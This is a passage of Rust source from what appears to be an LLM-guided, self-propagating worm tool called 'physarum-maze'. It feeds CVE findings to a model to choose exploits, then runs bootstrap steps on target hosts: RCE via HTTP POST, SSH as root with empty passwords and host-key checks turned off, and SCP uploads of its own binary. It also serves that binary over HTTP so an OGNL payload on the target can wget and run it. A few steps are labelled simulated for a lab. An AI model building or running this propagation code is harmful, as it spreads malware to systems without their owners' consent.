    candidates: Vec<physarum_llm::VulnerabilityCandidate>,
) -> PatternFindingSummary {
    let severity = match f.severity_hint {
        SeverityHint::Info => "info",
        SeverityHint::Low => "low",
        SeverityHint::Medium => "medium",
        SeverityHint::High => "high",
        SeverityHint::Critical => "critical",
        SeverityHint::Unknown => "unknown",
    };

    let extracted: Vec<String> = f
        .extracted_facts
        .iter()
        .flat_map(|fact| fact.values.iter().cloned())
        .collect();

    PatternFindingSummary {
        check_id: f.check_id.clone(),
        name: f.name.clone(),
        severity: severity.to_string(),
        confidence: f.confidence,
        matched_summary: f.matched_condition_summary.clone(),
        extracted,
        is_actionable: f.is_actionable(),
        vulnerability_candidates: candidates,
    }
}

// ── Lineage summary bridge ────────────────────────────────────────────────────

fn build_lineage_summary(lineage: &Lineage) -> physarum_llm::LineageSummary {
    let current_score = lineage.scores.values().copied().fold(0.0_f64, f64::max) as f32;

    physarum_llm::LineageSummary {
        node_id: lineage
            .path
            .last()
            .cloned()
            .unwrap_or_else(|| lineage.origin.clone()),
        hop_count: lineage.hops as u8,
        current_score,
        colonized_count: lineage.colonized.len(),
    }
}

// ── Bootstrap execution ───────────────────────────────────────────────────────

async fn execute_bootstrap(
    strategy: &physarum_llm::PropagationStrategy,
    target: Ipv4Addr,
    key_path: Option<&Path>,
) -> ExecutionResultSummary {
    let plan = match &strategy.bootstrap_plan {
        Some(p) => p,
        None => {
            tracing::info!(%target, "no bootstrap_plan in strategy — skipped");
            return ExecutionResultSummary::Skipped {
                reason: "no bootstrap_plan".into(),
            };
        }
    };

    for (i, step) in plan.steps.iter().enumerate() {
        match execute_step(&step.action, target, step.timeout_ms, key_path).await {
            StepResult::Ok | StepResult::Simulated => {
                tracing::debug!(%target, step = i, "step ok");
            }
            StepResult::Failed(reason) => {
                tracing::warn!(%target, step = i, %reason, "step failed");
                return ExecutionResultSummary::Failed {
                    description: format!("step {i}: {reason}"),
                };
            }
        }
    }

    ExecutionResultSummary::Success
}

#[derive(Debug)]
enum StepResult {
    Ok,
    Simulated,
    Failed(String),
}

/// Resolve the actual binary path for `__self__` sentinel in ScpUpload.
fn resolve_local_path(local_path: &str) -> String {
    if local_path == "__self__" {
        std::env::current_exe()
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or_else(|_| "/usr/local/bin/physarum-maze".to_string())
    } else {
        local_path.to_string()
    }
}

/// Build SSH/SCP arguments for either ephemeral-key or empty-password auth.
///
/// With key: `-i <key_path> -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null`
/// Without key: caller must prefix command with `sshpass -p ""`
fn ssh_opts(key_path: Option<&Path>) -> Vec<String> {
    let mut opts = vec![
        "-o".into(),
        "StrictHostKeyChecking=no".into(),
        "-o".into(),
        "UserKnownHostsFile=/dev/null".into(),
    ];
    if let Some(k) = key_path {
        opts.push("-i".into());
        opts.push(k.to_string_lossy().to_string());
    }
    opts
}

async fn execute_step(
    action: &BootstrapAction,
    target: Ipv4Addr,
    timeout_ms: u64,
    key_path: Option<&Path>,
) -> StepResult {
    use tokio::process::Command;
    use tokio::time::{timeout, Duration};

    match action {
        BootstrapAction::HttpGet { path, port } => {
            let p = port.unwrap_or(80);
            let url = format!("http://{}:{}{}", target, p, path);
            tracing::info!(%url, "HTTP GET");
            match timeout(Duration::from_millis(timeout_ms), reqwest::get(&url)).await {
                Ok(Ok(r)) if r.status().is_success() => StepResult::Ok,
                Ok(Ok(r)) => StepResult::Failed(format!("HTTP {}", r.status())),
                Ok(Err(e)) => StepResult::Failed(e.to_string()),
                Err(_) => StepResult::Failed("timeout".into()),
            }
        }

        BootstrapAction::HttpPost {
            path,
            body,
            port,
            headers,
            accept_any_response,
        } => {
            let p = port.unwrap_or(80);
            let url = format!("http://{}:{}{}", target, p, path);
            tracing::info!(%url, custom_headers = headers.len(), accept_any = accept_any_response, "HTTP POST");
            let client = reqwest::Client::new();
            let mut req = client.post(&url).body(body.clone());
            for (k, v) in headers {
                req = req.header(k.as_str(), v.as_str());
            }
            match timeout(Duration::from_millis(timeout_ms), req.send()).await {
                Ok(Ok(r)) => {
                    if r.status().is_success() || *accept_any_response {
                        tracing::info!(status = r.status().as_u16(), accept_any = accept_any_response, "HTTP POST completed");
                        StepResult::Ok
                    } else {
                        StepResult::Failed(format!("HTTP {}", r.status()))
                    }
                }
                Ok(Err(e)) => StepResult::Failed(e.to_string()),
                Err(_) => StepResult::Failed("timeout".into()),
            }
        }

        BootstrapAction::SshCommand { command, user } => {
            let remote_user = user.as_deref().unwrap_or("root");
            let connect_timeout = format!("ConnectTimeout={}", timeout_ms / 1000 + 1);
            tracing::info!(%target, %command, %remote_user, using_key = key_path.is_some(), "SSH command");

            let opts = ssh_opts(key_path);
            let mut args: Vec<String> = Vec::new();
            if key_path.is_none() {
                // Fall back to empty-password auth via sshpass
            }
            args.extend(opts);
            args.push("-o".into());
            args.push(connect_timeout);
            args.push(format!("{remote_user}@{target}"));
            args.push(command.clone());

            let ok = if key_path.is_some() {
                Command::new("ssh")
                    .args(&args)
                    .status()
                    .await
                    .map(|s| s.success())
                    .unwrap_or(false)
            } else {
                Command::new("sshpass")
                    .arg("-p").arg("")
                    .arg("ssh")
                    .args(&args)
                    .status()
                    .await
                    .map(|s| s.success())
                    .unwrap_or(false)
            };

            if ok { StepResult::Ok } else { StepResult::Failed("ssh command failed".into()) }
        }

        BootstrapAction::ScpUpload { local_path, remote_path, user } => {
            let actual_local = resolve_local_path(local_path);
            let remote_user = user.as_deref().unwrap_or("root");
            tracing::info!(
                %target, local = %actual_local, %remote_path, %remote_user,
                using_key = key_path.is_some(), "SCP upload"
            );

            let opts = ssh_opts(key_path);
            let mut scp_args: Vec<String> = opts;
            scp_args.push(actual_local);
            scp_args.push(format!("{remote_user}@{target}:{remote_path}"));

            let ok = if key_path.is_some() {
                Command::new("scp")
                    .args(&scp_args)
                    .status()
                    .await
                    .map(|s| s.success())
                    .unwrap_or(false)
            } else {
                Command::new("sshpass")
                    .arg("-p").arg("")
                    .arg("scp")
                    .args(&scp_args)
                    .status()
                    .await
                    .map(|s| s.success())
                    .unwrap_or(false)
            };

            if ok { StepResult::Ok } else { StepResult::Failed("scp upload failed".into()) }
        }

        BootstrapAction::ScpPullFromSource {
            source_ip,
            source_path,
            dest_path,
            secret_ref,
        } => {
            // Ephemeral key lifecycle (simulated in Phase 4 Docker Lab):
            //   1. Generate ed25519 key pair on Host A (source_ip).
            //   2. Add pubkey to authorized_keys on Host A.
            //   3. Deliver bootstrap script to target via RCE (prior HttpPost step).
            //   4. Script runs: Host B → Host A SCP pull.
            //   5. Remove pubkey from authorized_keys after propagation.
            // Phase 4: key generation and injection are logged, not yet executed.
            tracing::info!(
                %target, %source_ip, %source_path, %dest_path,
                key_id = %secret_ref.key_id,
                "ScpPullFromSource — simulated (Phase 4 Docker Lab)"
            );
            StepResult::Simulated
        }

        BootstrapAction::Custom { description } => {
            tracing::info!(
                %target, %description,
                "Custom action — skipped (requires explicit lab policy)"
            );
            StepResult::Simulated
        }
    }
}

// ── Helpers ───────────────────────────────────────────────────────────────────

fn method_class_of(method: &PropagationMethod) -> PropagationMethodClass {
    match method {
        PropagationMethod::Ssh { .. } => PropagationMethodClass::Ssh,
        PropagationMethod::Http { .. } => PropagationMethodClass::Http,
        PropagationMethod::Exploit { .. } => PropagationMethodClass::Exploit,
        PropagationMethod::Custom { .. } => PropagationMethodClass::Custom,
        PropagationMethod::NoPath { .. } => PropagationMethodClass::NoPath,
    }
}

fn strategy_fingerprint(strategy: &physarum_llm::PropagationStrategy) -> String {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    let json = serde_json::to_string(strategy).unwrap_or_default();
    let mut h = DefaultHasher::new();
    json.hash(&mut h);
    format!("hash:{:016x}", h.finish())
}

/// Extract the TCP port implied by a propagation method for lineage evidence.
fn method_port(method: &PropagationMethod) -> Option<u16> {
    match method {
        PropagationMethod::Ssh { .. } => Some(22),
        PropagationMethod::Http { port, .. } => *port,
        _ => None,
    }
}

// ── Ephemeral SSH keypair ─────────────────────────────────────────────────────

struct EphemeralKey {
    privkey_path: PathBuf,
    /// OpenSSH public key string (e.g. "ssh-ed25519 AAAA... physarum-ephemeral").
    pubkey: String,
}

/// Generate an ephemeral ed25519 SSH keypair via `ssh-keygen`.
///
/// Private key is written to `/tmp/physarum/ephemeral_key` (mode 600).
/// Public key is returned as an OpenSSH one-liner for embedding in DiscoveryQuery.
/// Both files are cleaned up by the caller after the exploit loop exits.
async fn generate_ephemeral_keypair() -> anyhow::Result<EphemeralKey> {
    use tokio::process::Command;

    let key_dir = PathBuf::from("/tmp/physarum");
    tokio::fs::create_dir_all(&key_dir).await?;

    let privkey_path = key_dir.join("ephemeral_key");
    // Remove stale key if present — ssh-keygen refuses to overwrite.
    let _ = tokio::fs::remove_file(&privkey_path).await;
    let _ = tokio::fs::remove_file(privkey_path.with_extension("pub")).await;

    let status = Command::new("ssh-keygen")
        .args([
            "-t", "ed25519",
            "-f", privkey_path.to_str().unwrap_or("/tmp/physarum/ephemeral_key"),
            "-N", "",                   // empty passphrase
            "-C", "physarum-ephemeral", // comment — identifies the key in authorized_keys
            "-q",                       // quiet
        ])
        .status()
        .await?;

    anyhow::ensure!(status.success(), "ssh-keygen exited with {status}");

    let pubkey_path = privkey_path.with_extension("pub");
    let pubkey = tokio::fs::read_to_string(&pubkey_path).await?;

    Ok(EphemeralKey {
        privkey_path,
        pubkey: pubkey.trim().to_string(),
    })
}

// ── Template catalog builder ─────────────────────────────────────────────────

/// Maximum number of templates sent to the LLM for Turn 1 selection.
/// CVE-specific templates are included first; remaining are sorted alphabetically.
const MAX_TEMPLATES_FOR_SELECTION: usize = 200;

/// Build a compact `TemplateMeta` catalog for LLM Turn 1 selection.
///
/// CVE-specific templates (id starts with "CVE-") are always placed first so
/// the LLM sees the most actionable candidates even when the list is truncated.
/// The remaining templates are sorted by id for stable ordering.
fn build_template_catalog_for_llm(
    templates: &[physarum_sporangium::PatternTemplate],
    _ports: &[PortScan],
) -> Vec<TemplateMeta> {
    let mut cve_first: Vec<&physarum_sporangium::PatternTemplate> = templates
        .iter()
        .filter(|t| t.id.starts_with("CVE-"))
        .collect();
    let mut rest: Vec<&physarum_sporangium::PatternTemplate> =
        templates.iter().filter(|t| !t.id.starts_with("CVE-")).collect();

    cve_first.sort_by(|a, b| a.id.cmp(&b.id));
    rest.sort_by(|a, b| a.id.cmp(&b.id));
    cve_first.extend(rest);

    cve_first
        .into_iter()
        .take(MAX_TEMPLATES_FOR_SELECTION)
        .map(|t| TemplateMeta {
            id: t.id.clone(),
            severity: format!("{:?}", t.info.severity).to_ascii_lowercase(),
            tags: t.info.tags.clone(),
        })
        .collect()
}

// ── Binary HTTP server for exploit bootstrap ─────────────────────────────────

/// Start a lightweight HTTP server on `local_ip:8001` serving the physarum-maze
/// binary at `/physarum-maze`. Used by Phase 2 exploit bootstrap: the OGNL payload
/// on the target runs `wget http://<local_ip>:8001/physarum-maze` to fetch and
/// execute the binary.
///
/// Returns the `JoinHandle` so the caller can shut it down after propagation.
/// The server is already non-blocking: it listens in the background and the
/// returned handle can be aborted when the exploit step completes.
async fn start_binary_server(
    local_ip: Ipv4Addr,
) -> Option<tokio::task::JoinHandle<()>> {
    use tokio::net::TcpListener;

    let binary_path = std::env::current_exe().ok()?;
    if !binary_path.exists() {
        tracing::warn!(%local_ip, "binary not found at {:?} — exploit HTTP server not started", binary_path);
        return None;
    }

    let addr = SocketAddr::new(IpAddr::V4(local_ip), 8001);
    let listener = match TcpListener::bind(addr).await {
        Ok(l) => l,
        Err(e) => {
            tracing::warn!(%local_ip, err = %e, "could not bind exploit HTTP server on :8001");
            return None;
        }
    };

    tracing::info!(%local_ip, addr = %addr, "exploit HTTP server started — serving physarum-maze binary");

    let handle = tokio::spawn(async move {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        loop {
            let (mut socket, peer) = match listener.accept().await {
                Ok(s) => s,
                Err(_) => break,
            };
            let binary_path = binary_path.clone();
            tokio::spawn(async move {
                let mut buf = [0u8; 512];
                let _ = socket.read(&mut buf).await;
                match tokio::fs::read(&binary_path).await {
                    Ok(data) => {
                        let header = format!(
                            "HTTP/1.0 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: {}\r\n\r\n",
                            data.len()
                        );
                        let _ = socket.write_all(header.as_bytes()).await;
                        let _ = socket.write_all(&data).await;
                        tracing::debug!(%peer, bytes = data.len(), "physarum-maze binary served");
                    }
                    Err(e) => {
                        tracing::warn!(%peer, err = %e, "failed to read binary for exploit server");
                        let _ = socket.write_all(b"HTTP/1.0 500 Internal Server Error\r\n\r\n").await;
                    }
                }
            });
        }
    });

    Some(handle)
}

/// Collect deduplicated CVE IDs from all pattern-finding candidates.
/// Computed once before the attempt loop; stable across retries.
///
/// Two sources:
/// 1. `vulnerability_candidates` from VulnIntel advisory-cache lookup (generic templates
///    with version extractors → LocalAdvisoryCache → CVE).
/// 2. `check_id` when the template itself IS a CVE-specific template (e.g. CVE-2021-31805)
///    — the template firing is direct evidence of that CVE; no advisory lookup needed.
fn extract_cve_ids(summaries: &[PatternFindingSummary]) -> Vec<String> {
    let mut ids: Vec<String> = summaries
        .iter()
        .flat_map(|f| {
            let from_candidates = f.vulnerability_candidates.iter().map(|c| c.cve_id.clone());
            let from_template_id = if f.check_id.starts_with("CVE-") {
                Some(f.check_id.clone())
            } else {
                None
            };
            from_candidates.chain(from_template_id)
        })
        .collect();
    ids.sort();
    ids.dedup();
    ids
}
